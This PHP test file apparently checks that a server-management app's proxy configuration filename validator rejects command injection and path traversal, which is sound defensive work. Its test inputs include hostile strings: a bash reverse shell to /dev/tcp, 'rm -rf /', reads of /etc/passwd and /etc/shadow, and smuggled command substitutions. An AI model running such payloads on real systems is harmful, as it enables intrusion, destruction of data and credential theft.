<?php

/**
 * Proxy Configuration Security Tests
 *
 * Tests to ensure dynamic proxy configuration management is protected against
 * command injection attacks via malicious filenames.
 *
 * Related Issues: #5 in security_issues.md
 * Related Files:
 *  - app/Livewire/Server/Proxy/NewDynamicConfiguration.php
 *  - app/Livewire/Server/Proxy/DynamicConfigurationNavbar.php
 */
test('proxy configuration rejects command injection in filename with command substitution', function () {
    expect(fn () => validateFilenameSafe('test$(whoami)', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with semicolon', function () {
    expect(fn () => validateFilenameSafe('config; id > /tmp/pwned', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with pipe', function () {
    expect(fn () => validateFilenameSafe('config | cat /etc/passwd', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with backticks', function () {
    expect(fn () => validateFilenameSafe('config`whoami`.yaml', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with ampersand', function () {
    expect(fn () => validateFilenameSafe('config && rm -rf /', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with redirect operators', function () {
    expect(fn () => validateFilenameSafe('test > /tmp/evil', 'proxy configuration filename'))
        ->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('test < /etc/shadow', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects reverse shell payload', function () {
    expect(fn () => validateFilenameSafe('test$(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1)', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects path traversal filenames', function (string $filename) {
    expect(fn () => validateFilenameSafe($filename, 'proxy configuration filename'))
        ->toThrow(Exception::class);
})->with([
    '../VICTIM_FILE',
    '../../etc/shadow',
    '/etc/passwd',
    'subdir/config.yaml',
    'subdir\\config.yaml',
    'config..yaml',
    "config.yaml\0../../etc/passwd",
]);

test('dynamic proxy components use filename-safe validation', function () {
    $deleteComponent = file_get_contents(getcwd().'/app/Livewire/Server/Proxy/DynamicConfigurationNavbar.php');
    $createComponent = file_get_contents(getcwd().'/app/Livewire/Server/Proxy/NewDynamicConfiguration.php');

    expect($deleteComponent)
        ->toContain("validateFilenameSafe(\$file, 'proxy configuration filename')")
        ->not->toContain("validateShellSafePath(\$file, 'proxy configuration filename')");

    expect($createComponent)
        ->toContain("validateFilenameSafe(\$this->fileName, 'proxy configuration filename')")
        ->not->toContain("validateShellSafePath(\$this->fileName, 'proxy configuration filename')");
});

test('proxy configuration escapes filenames properly', function () {
    $filename = "config'test.yaml";
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'config'\\''test.yaml'");
});

test('proxy configuration escapes filenames with spaces', function () {
    $filename = 'my config.yaml';
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'my config.yaml'");
});

test('proxy configuration accepts legitimate Traefik filenames', function () {
    expect(fn () => validateFilenameSafe('my-service.yaml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('app.yml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('router_config.yaml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);
});

test('proxy configuration accepts legitimate Caddy filenames', function () {
    expect(fn () => validateFilenameSafe('my-service.caddy', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('app_config.caddy', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);
});
